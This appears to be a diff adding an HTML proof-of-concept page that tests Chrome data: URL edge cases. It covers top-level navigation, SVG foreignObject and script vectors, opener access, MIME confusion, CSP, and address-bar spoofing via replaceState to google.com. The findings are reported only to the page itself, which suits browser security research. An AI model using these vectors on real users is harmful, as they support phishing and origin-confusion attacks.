@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>PoC: data: URL Navigation Edge Cases — Chrome 145</title>
+<style>
+  body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
+  h1 { color: #ff6b6b; }
+  h2 { color: #ffa500; }
+  .test-case { background: #16213e; border: 1px solid #333; padding: 15px; margin: 10px 0; border-radius: 5px; }
+  pre { white-space: pre-wrap; word-break: break-all; color: #7bed9f; max-height: 250px; overflow-y: auto; }
+  button { background: #e74c3c; color: #fff; border: none; padding: 8px 16px; cursor: pointer; margin: 4px; border-radius: 3px; }
+  button:hover { background: #c0392b; }
+  .warn { color: #f1c40f; font-size: 0.85em; }
+  iframe { border: 1px solid #555; }
+</style>
+</head>
+<body>
+<h1>PoC: data: URL Navigation Edge Cases</h1>
+<p class="warn">Target: Chrome 145 | Tests data: URL navigation, SVG embedding, origin inheritance, and URL bar display</p>
+<p class="warn">Related: CVE-2023-2723, CVE-2022-1497, CVE-2021-30560 (data URL navigation issues)</p>
+
+<h2>Test 1: Top-level data: URL navigation</h2>
+<div class="test-case">
+  <p>Attempts to navigate the top-level window to a data: URL. Chrome blocks this from non-user-gesture contexts since ~M60.</p>
+  <button onclick="test1()">Navigate to data: URL</button>
+  <pre id="t1"></pre>
+</div>
+
+<h2>Test 2: data: URL with SVG containing embedded iframe</h2>
+<div class="test-case">
+  <p>Creates a data: URL SVG with foreignObject containing an iframe. Tests if the iframe can escape the data: origin sandbox.</p>
+  <button onclick="test2()">Run Test</button>
+  <pre id="t2"></pre>
+  <iframe id="t2frame" style="width:100%;height:200px;display:none;"></iframe>
+</div>
+
+<h2>Test 3: data: URL origin and opener inheritance</h2>
+<div class="test-case">
+  <p>Opens data: URL via window.open and checks origin inheritance and opener access.</p>
+  <button onclick="test3()">Run Test</button>
+  <pre id="t3"></pre>
+</div>
+
+<h2>Test 4: data: URL in iframe with srcdoc nesting</h2>
+<div class="test-case">
+  <p>Nests data: URLs in iframes with srcdoc. Tests origin isolation at each level.</p>
+  <button onclick="test4()">Run Test</button>
+  <pre id="t4"></pre>
+  <iframe id="t4frame" style="width:100%;height:150px;display:none;"></iframe>
+</div>
+
+<h2>Test 5: data: URL address bar display issues</h2>
+<div class="test-case">
+  <p>Tests what Chrome shows in the address bar for various data: URL patterns.</p>
+  <button onclick="test5()">Run Test</button>
+  <pre id="t5"></pre>
+</div>
+
+<h2>Test 6: data: URL + history.pushState</h2>
+<div class="test-case">
+  <p>Navigates to data: URL and attempts pushState to change displayed URL.</p>
+  <button onclick="test6()">Run Test</button>
+  <pre id="t6"></pre>
+</div>
+
+<h2>Test 7: data: URL MIME type confusion</h2>
+<div class="test-case">
+  <p>Tests various MIME types in data: URLs for execution context differences.</p>
+  <button onclick="test7()">Run Test</button>
+  <pre id="t7"></pre>
+  <iframe id="t7frame" style="width:100%;height:120px;display:none;"></iframe>
+</div>
+
+<h2>Test 8: data: URL with Content Security Policy</h2>
+<div class="test-case">
+  <p>Tests if CSP on parent page affects data: URL iframe execution.</p>
+  <button onclick="test8()">Run Test</button>
+  <pre id="t8"></pre>
+  <iframe id="t8frame" style="width:100%;height:100px;display:none;"></iframe>
+</div>
+
+<h2>Test 9: Large/crafted data: URLs</h2>
+<div class="test-case">
+  <p>Tests edge cases with very large data: URLs, nested data: URLs, and malformed data: URLs.</p>
+  <button onclick="test9()">Run Test</button>
+  <pre id="t9"></pre>
+</div>
+
+<h2>Test 10: data: URL with SVG script execution</h2>
+<div class="test-case">
+  <p>Tests if JavaScript inside data: URL SVGs can execute and access the parent context.</p>
+  <button onclick="test10()">Run Test</button>
+  <pre id="t10"></pre>
+  <iframe id="t10frame" style="width:100%;height:150px;display:none;"></iframe>
+</div>
+
+<script>
+function log(id, msg) {
+  const el = document.getElementById(id);
+  el.textContent += msg + '\n';
+  el.scrollTop = el.scrollHeight;
+}
+
+// Test 1: Top-level data: URL navigation
+function test1() {
+  log('t1', '=== Top-level data: URL Navigation ===');
+  log('t1', `Current origin: ${location.origin}`);
+
+  // Try direct navigation
+  log('t1', '\n[1] location.href = data:text/html,...');
+  try {
+    // This should be blocked in modern Chrome
+    location.href = 'data:text/html,<h1>Navigated to data URL!</h1>';
+    log('t1', 'Navigation initiated (may be blocked by browser)');
+  } catch (e) {
+    log('t1', `Blocked: ${e.message}`);
+  }
+
+  // Try via window.open
+  log('t1', '\n[2] window.open(data:text/html,...)');
+  const w = window.open('data:text/html,<h1>data: URL in new tab</h1><p>Check URL bar</p>');
+  if (w) {
+    log('t1', 'Window opened. Check URL bar in new tab.');
+    setTimeout(() => {
+      try {
+        log('t1', `New window URL: ${w.location.href.substring(0, 100)}`);
+        log('t1', `New window origin: ${w.location.origin}`);
+      } catch (e) {
+        log('t1', `Cannot read new window: ${e.message}`);
+      }
+    }, 500);
+  } else {
+    log('t1', 'window.open blocked (expected for data: URLs in modern Chrome)');
+  }
+
+  // Try via form action
+  log('t1', '\n[3] Form with data: URL action');
+  const form = document.createElement('form');
+  form.action = 'data:text/html,<h1>Form submitted to data URL</h1>';
+  form.method = 'GET';
+  form.target = '_blank';
+  try {
+    form.submit();
+    log('t1', 'Form submitted to data: URL');
+  } catch (e) {
+    log('t1', `Form submit blocked: ${e.message}`);
+  }
+}
+
+// Test 2: SVG with embedded iframe
+function test2() {
+  var frame = document.getElementById('t2frame');
+  frame.style.display = 'block';
+
+  const svgContent = `<svg xmlns="http://www.w3.org/2000/svg" width="600" height="200">
+  <rect width="100%" height="100%" fill="#f0f0f0"/>
+  <text x="10" y="30" font-family="monospace" font-size="14" fill="red">
+    SVG loaded via data: URL
+  </text>
+  <foreignObject x="10" y="40" width="580" height="150">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <iframe src="javascript:document.write('Iframe inside SVG foreignObject')" 
+              style="width:100%;height:50px;border:1px solid red;"></iframe>
+      <iframe src="https://example.com" 
+              style="width:100%;height:50px;border:1px solid blue;"></iframe>
+      <script xmlns="http://www.w3.org/1999/xhtml">
+        try {
+          parent.postMessage({type:'t2', msg:'Script executed inside SVG foreignObject! Origin: ' + location.origin}, '*');
+        } catch(e) {
+          parent.postMessage({type:'t2', msg:'SVG script error: ' + e.message}, '*');
+        }
+      </script>
+    </body>
+  </foreignObject>
+</svg>`;
+
+  const dataUrl = 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(svgContent);
+  frame.src = dataUrl;
+
+  log('t2', `data: URL SVG loaded in iframe (${dataUrl.length} chars)`);
+  log('t2', 'Testing: foreignObject iframe + script execution...');
+
+  window.addEventListener('message', (e) => {
+    if (e.data && e.data.type === 't2') {
+      log('t2', `[message] ${e.data.msg}`);
+    }
+  });
+
+  // Also test SVG as <img> (no script execution expected)
+  const img = document.createElement('img');
+  img.src = dataUrl;
+  img.onerror = () => log('t2', 'SVG as <img> load error');
+  img.onload = () => log('t2', 'SVG as <img> loaded (scripts should NOT execute in img context)');
+}
+
+// Test 3: data: URL opener inheritance
+function test3() {
+  log('t3', '=== data: URL Opener/Origin Test ===');
+
+  const html = `<!DOCTYPE html><html><body style="font-family:monospace;padding:20px;">
+<h2>data: URL Window</h2>
+<pre id="log">Analyzing...</pre>
+<script>
+  const l = document.getElementById('log');
+  l.textContent += '\\nLocation: ' + location.href.substring(0, 80) + '...';
+  l.textContent += '\\nOrigin: ' + location.origin;
+  l.textContent += '\\nProtocol: ' + location.protocol;
+
+  // Opener check
+  if (window.opener) {
+    l.textContent += '\\nHas opener: YES';
+    try {
+      l.textContent += '\\nOpener origin: ' + window.opener.location.origin;
+      l.textContent += '\\nFINDING: data: URL can read opener origin!';
+    } catch(e) {
+      l.textContent += '\\nOpener access blocked: ' + e.message;
+    }
+
+    // Can data: URL navigate opener?
+    try {
+      const openerLoc = typeof window.opener.location;
+      l.textContent += '\\nOpener location type: ' + openerLoc;
+    } catch(e) {
+      l.textContent += '\\nOpener navigation check: ' + e.message;
+    }
+  } else {
+    l.textContent += '\\nNo opener';
+  }
+
+  // Test storage access
+  try {
+    localStorage.setItem('dataurl_test', '1');
+    l.textContent += '\\nlocalStorage: accessible';
+    localStorage.removeItem('dataurl_test');
+  } catch(e) {
+    l.textContent += '\\nlocalStorage: ' + e.message;
+  }
+
+  // Test cookies
+  try {
+    l.textContent += '\\nCookies: ' + (document.cookie || '(empty)');
+  } catch(e) {
+    l.textContent += '\\nCookies error: ' + e.message;
+  }
+<\/script>
+</body></html>`;
+
+  const dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
+  const w = window.open(dataUrl);
+
+  if (w) {
+    log('t3', 'Opened data: URL in new window.');
+    log('t3', 'Check new window for origin/opener inheritance results.');
+  } else {
+    log('t3', 'Blocked. Chrome blocks top-level data: URL navigation.');
+    log('t3', 'Trying alternative: data: URL in iframe...');
+
+    var frame = document.createElement('iframe');
+    frame.style.cssText = 'width:100%;height:200px;border:1px solid #555;';
+    frame.src = dataUrl;
+    document.getElementById('t3').parentElement.appendChild(frame);
+    log('t3', 'data: URL loaded in iframe instead.');
+
+    frame.addEventListener('load', () => {
+      try {
+        log('t3', `iframe origin: ${frame.contentWindow.location.origin}`);
+        log('t3', `iframe href: ${frame.contentWindow.location.href.substring(0, 80)}...`);
+      } catch (e) {
+        log('t3', `Cannot read iframe: ${e.message}`);
+      }
+    });
+  }
+}
+
+// Test 4: Nested data: URL iframes
+function test4() {
+  var frame = document.getElementById('t4frame');
+  frame.style.display = 'block';
+
+  const innerDataUrl = 'data:text/html,' + encodeURIComponent(
+    `<html><body style="font-family:monospace;font-size:11px;">
+    <b>Level 2 (data: URL)</b><br>
+    Origin: <script>document.write(location.origin)</script><br>
+    <script>
+      try { 
+        document.write('Parent origin: ' + parent.location.origin + '<br>');
+        document.write('Can access parent: YES<br>');
+      } catch(e) { 
+        document.write('Parent blocked: ' + e.message + '<br>');
+      }
+      try {
+        document.write('Top origin: ' + top.location.origin + '<br>');
+      } catch(e) {
+        document.write('Top blocked: ' + e.message + '<br>');
+      }
+      parent.postMessage({type:'t4', level:2, origin:location.origin}, '*');
+    </script>
+    </body></html>`
+  );
+
+  const outerHtml = `<html><body style="font-family:monospace;font-size:11px;">
+    <b>Level 1 (srcdoc)</b><br>
+    Origin: <script>document.write(location.origin)</script><br>
+    <script>
+      try { 
+        document.write('Parent origin: ' + parent.location.origin + '<br>');
+      } catch(e) { 
+        document.write('Parent blocked: ' + e.message + '<br>');
+      }
+      parent.postMessage({type:'t4', level:1, origin:location.origin}, '*');
+    </script>
+    <iframe src="${innerDataUrl}" style="width:100%;height:60px;border:1px solid red;"></iframe>
+    </body></html>`;
+
+  frame.srcdoc = outerHtml;
+
+  window.addEventListener('message', (e) => {
+    if (e.data && e.data.type === 't4') {
+      log('t4', `Level ${e.data.level} reports origin: ${e.data.origin}`);
+    }
+  });
+
+  log('t4', 'Nested iframe chain: page → srcdoc → data: URL');
+  log('t4', 'Testing origin isolation at each level...');
+}
+
+// Test 5: data: URL address bar display
+function test5() {
+  log('t5', '=== data: URL Address Bar Display Tests ===');
+
+  const testCases = [
+    {
+      name: 'Short data URL',
+      url: 'data:text/html,<h1>Short</h1>'
+    },
+    {
+      name: 'Long data URL (truncation test)',
+      url: 'data:text/html,' + encodeURIComponent('<h1>' + 'A'.repeat(10000) + '</h1>')
+    },
+    {
+      name: 'data URL mimicking HTTPS',
+      url: 'data:text/html,<title>https://google.com</title><h1>Fake Google</h1>'
+    },
+    {
+      name: 'data URL with base64',
+      url: 'data:text/html;base64,' + btoa('<h1>Base64 encoded</h1>')
+    },
+    {
+      name: 'data URL with charset',
+      url: 'data:text/html;charset=utf-8,<h1>With charset</h1>'
+    },
+    {
+      name: 'data URL with multiple params',
+      url: 'data:text/html;charset=utf-8;base64,' + btoa('<h1>Multi-param</h1>')
+    },
+  ];
+
+  for (const tc of testCases) {
+    var frame = document.createElement('iframe');
+    frame.style.cssText = 'width:100%;height:40px;border:1px solid #444;margin:2px 0;';
+    frame.src = tc.url;
+    document.getElementById('t5').parentElement.appendChild(frame);
+    log('t5', `${tc.name}: ${tc.url.substring(0, 100)}${tc.url.length > 100 ? '...' : ''} (${tc.url.length} chars)`);
+
+    frame.addEventListener('load', () => {
+      try {
+        log('t5', `  → loaded, origin: ${frame.contentWindow.location.origin}`);
+      } catch (e) {
+        log('t5', `  → cannot read: ${e.message}`);
+      }
+    });
+  }
+}
+
+// Test 6: data: URL + pushState
+function test6() {
+  log('t6', '=== data: URL + pushState ===');
+
+  const html = `<!DOCTYPE html><html><body style="font-family:monospace;padding:20px;">
+<pre id="log">Testing pushState on data: URL...</pre>
+<script>
+  const l = document.getElementById('log');
+  l.textContent += '\\nInitial URL: ' + location.href.substring(0, 80);
+  l.textContent += '\\nInitial origin: ' + location.origin;
+
+  // Try pushState
+  try {
+    history.pushState({}, '', '/spoofed-path');
+    l.textContent += '\\npushState succeeded! URL: ' + location.href;
+    l.textContent += '\\nFINDING: pushState works on data: URL!';
+  } catch(e) {
+    l.textContent += '\\npushState blocked: ' + e.message;
+  }
+
+  // Try replaceState
+  try {
+    history.replaceState({}, '', 'https://google.com/');
+    l.textContent += '\\nreplaceState to https://google.com/ succeeded!';
+    l.textContent += '\\nCRITICAL: URL bar may show https://google.com!';
+  } catch(e) {
+    l.textContent += '\\nreplaceState cross-origin blocked: ' + e.message;
+  }
+
+  // Try replaceState with another data URL
+  try {
+    history.replaceState({}, '', 'data:text/html,spoofed');
+    l.textContent += '\\nreplaceState to another data: URL succeeded!';
+  } catch(e) {
+    l.textContent += '\\nreplaceState to data: blocked: ' + e.message;
+  }
+</script>
+</body></html>`;
+
+  const dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
+
+  // Try in iframe
+  var frame = document.createElement('iframe');
+  frame.style.cssText = 'width:100%;height:200px;border:1px solid #555;';
+  frame.src = dataUrl;
+  document.getElementById('t6').parentElement.appendChild(frame);
+  log('t6', 'data: URL with pushState test loaded in iframe.');
+}
+
+// Test 7: MIME type confusion
+function test7() {
+  var frame = document.getElementById('t7frame');
+  frame.style.display = 'block';
+
+  const mimeTests = [
+    { mime: 'text/html', content: '<script>parent.postMessage({type:"t7",mime:"text/html",exec:true},"*")<\/script>' },
+    { mime: 'text/plain', content: '<script>parent.postMessage({type:"t7",mime:"text/plain",exec:true},"*")<\/script>' },
+    { mime: 'text/xml', content: '<root><script xmlns="http://www.w3.org/1999/xhtml">parent.postMessage({type:"t7",mime:"text/xml",exec:true},"*")</script></root>' },
+    { mime: 'application/xhtml+xml', content: '<html xmlns="http://www.w3.org/1999/xhtml"><body><script>parent.postMessage({type:"t7",mime:"xhtml",exec:true},"*")</script></body></html>' },
+    { mime: 'image/svg+xml', content: '<svg xmlns="http://www.w3.org/2000/svg"><script>parent.postMessage({type:"t7",mime:"svg",exec:true},"*")</script></svg>' },
+    { mime: 'application/javascript', content: 'parent.postMessage({type:"t7",mime:"application/javascript",exec:true},"*")' },
+  ];
+
+  log('t7', 'Testing script execution across MIME types...');
+
+  let i = 0;
+  function nextMimeTest() {
+    if (i >= mimeTests.length) {
+      log('t7', 'All MIME tests complete.');
+      return;
+    }
+    const test = mimeTests[i];
+    const url = 'data:' + test.mime + ',' + encodeURIComponent(test.content);
+    frame.src = url;
+    log('t7', `Testing ${test.mime}...`);
+    i++;
+    setTimeout(nextMimeTest, 1000);
+  }
+
+  window.addEventListener('message', (e) => {
+    if (e.data && e.data.type === 't7') {
+      log('t7', `  ✓ ${e.data.mime}: SCRIPT EXECUTED`);
+    }
+  });
+
+  // Set timeout to detect non-execution
+  mimeTests.forEach((test, idx) => {
+    setTimeout(() => {
+      // This will log for all, but execution messages will appear before
+      log('t7', `  [${test.mime}] timeout check (no execution message = blocked)`);
+    }, (idx + 1) * 1000 + 500);
+  });
+
+  nextMimeTest();
+}
+
+// Test 8: CSP interaction with data: URLs
+function test8() {
+  var frame = document.getElementById('t8frame');
+  frame.style.display = 'block';
+
+  // Create an iframe with CSP that restricts data: URLs
+  const outerHtml = `<!DOCTYPE html><html>
+<head>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline'; frame-src data:;">
+</head>
+<body style="font-family:monospace;font-size:11px;">
+<pre id="log">CSP page loaded.</pre>
+<iframe id="inner" style="width:100%;height:40px;border:1px solid red;"></iframe>
+<script>
+  const l = document.getElementById('log');
+  const inner = document.getElementById('inner');
+
+  // Set data: URL in iframe under CSP
+  inner.src = 'data:text/html,<script>parent.postMessage({type:"t8",msg:"data: iframe script executed under CSP"},"*")<\\/script>';
+  l.textContent += '\\nLoaded data: URL iframe under CSP';
+
+  // Report CSP violations
+  document.addEventListener('securitypolicyviolation', (e) => {
+    l.textContent += '\\nCSP violation: ' + e.violatedDirective + ' - ' + e.blockedURI;
+    parent.postMessage({type:'t8', msg:'CSP violation: ' + e.violatedDirective}, '*');
+  });
+</script>
+</body></html>`;
+
+  frame.srcdoc = outerHtml;
+
+  window.addEventListener('message', (e) => {
+    if (e.data && e.data.type === 't8') {
+      log('t8', e.data.msg);
+    }
+  });
+
+  log('t8', 'Testing CSP interaction with data: URL iframes...');
+}
+
+// Test 9: Edge case data: URLs
+function test9() {
+  log('t9', '=== Edge Case data: URLs ===');
+
+  const edgeCases = [
+    { name: 'Empty data URL', url: 'data:,' },
+    { name: 'Null byte in data URL', url: 'data:text/html,hello\x00world' },
+    { name: 'Very long (100KB)', url: 'data:text/html,' + 'A'.repeat(100000) },
+    { name: 'Nested data URL', url: 'data:text/html,<iframe src="data:text/html,nested"></iframe>' },
+    { name: 'Double-encoded', url: 'data:text/html,' + encodeURIComponent(encodeURIComponent('<h1>Double</h1>')) },
+    { name: 'Mixed encoding', url: 'data:text/html;charset=utf-8,%3Ch1%3EMixed%3C/h1%3E<script>1<\/script>' },
+    { name: 'No MIME type', url: 'data:,Hello' },
+    { name: 'Unknown MIME', url: 'data:application/x-evil,test' },
+    { name: 'Multipart MIME', url: 'data:multipart/mixed,test' },
+    { name: 'data: with fragment', url: 'data:text/html,<h1>test</h1>#fragment' },
+    { name: 'data: with query', url: 'data:text/html,<h1>test</h1>?query=1' },
+  ];
+
+  for (const tc of edgeCases) {
+    var frame = document.createElement('iframe');
+    frame.style.cssText = 'width:0;height:0;position:absolute;';
+    document.body.appendChild(frame);
+
+    try {
+      frame.src = tc.url;
+      log('t9', `✓ ${tc.name} (${tc.url.length} chars): accepted`);
+    } catch (e) {
+      log('t9', `✗ ${tc.name}: ${e.message}`);
+    }
+
+    frame.addEventListener('load', () => {
+      try {
+        const origin = frame.contentWindow.location.origin;
+        log('t9', `  → origin: ${origin}`);
+      } catch (e) { /* cross-origin */ }
+      document.body.removeChild(frame);
+    });
+
+    frame.addEventListener('error', () => {
+      log('t9', `  → load error`);
+      document.body.removeChild(frame);
+    });
+  }
+}
+
+// Test 10: SVG script execution via data: URL
+function test10() {
+  var frame = document.getElementById('t10frame');
+  frame.style.display = 'block';
+
+  const svg = `<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" 
+     width="600" height="150" viewBox="0 0 600 150">
+  <rect width="100%" height="100%" fill="#fff"/>
+  
+  <!-- Direct script in SVG -->
+  <script type="text/javascript">
+    // Test 1: Can we access the parent?
+    try {
+      parent.postMessage({type:'t10', test:'direct-script', origin: location.origin, 
+        msg: 'Direct SVG script executed'}, '*');
+    } catch(e) {
+      parent.postMessage({type:'t10', test:'direct-script', msg: 'Error: '+e.message}, '*');
+    }
+  </script>
+  
+  <!-- Event handler script -->
+  <rect x="10" y="10" width="200" height="40" fill="#e74c3c" rx="5"
+        onclick="parent.postMessage({type:'t10',test:'onclick',msg:'SVG onclick executed'},'*')"/>
+  <text x="20" y="35" fill="white" font-family="monospace" font-size="12">Click me (SVG onclick)</text>
+  
+  <!-- foreignObject with HTML -->
+  <foreignObject x="10" y="60" width="580" height="80">
+    <body xmlns="http://www.w3.org/1999/xhtml" style="font-family:monospace;font-size:11px;margin:0;">
+      <div id="fo-log">foreignObject loaded</div>
+      <script xmlns="http://www.w3.org/1999/xhtml">
+        document.getElementById('fo-log').textContent += ' | Script in foreignObject executed';
+        try {
+          parent.postMessage({type:'t10', test:'foreignObject', origin: location.origin,
+            msg: 'foreignObject script executed'}, '*');
+        } catch(e) {
+          parent.postMessage({type:'t10', test:'foreignObject', msg: 'Error: '+e.message}, '*');
+        }
+      </script>
+    </body>
+  </foreignObject>
+  
+  <!-- use element with external reference -->
+  <use xlink:href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>parent.postMessage({type:'t10',test:'use-xlink'},'*')</script></svg>#x"/>
+  
+  <!-- animate with script -->
+  <set attributeName="onbegin" to="parent.postMessage({type:'t10',test:'set-onbegin'},'*')"/>
+</svg>`;
+
+  const dataUrl = 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(svg);
+  frame.src = dataUrl;
+
+  log('t10', 'Loaded SVG with multiple script vectors via data: URL');
+  log('t10', 'Vectors: direct <script>, onclick, foreignObject, use+xlink, set+onbegin');
+
+  window.addEventListener('message', (e) => {
+    if (e.data && e.data.type === 't10') {
+      log('t10', `[${e.data.test}] ${e.data.msg}${e.data.origin ? ' (origin: ' + e.data.origin + ')' : ''}`);
+    }
+  });
+
+  // Also test SVG via <object> and <embed>
+  setTimeout(() => {
+    const obj = document.createElement('object');
+    obj.data = dataUrl;
+    obj.type = 'image/svg+xml';
+    obj.style.cssText = 'width:0;height:0;';
+    document.body.appendChild(obj);
+    log('t10', 'Also loaded SVG via <object> element');
+
+    const embed = document.createElement('embed');
+    embed.src = dataUrl;
+    embed.type = 'image/svg+xml';
+    embed.style.cssText = 'width:0;height:0;';
+    document.body.appendChild(embed);
+    log('t10', 'Also loaded SVG via <embed> element');
+  }, 1000);
+}
+</script>
+</body>
+</html>
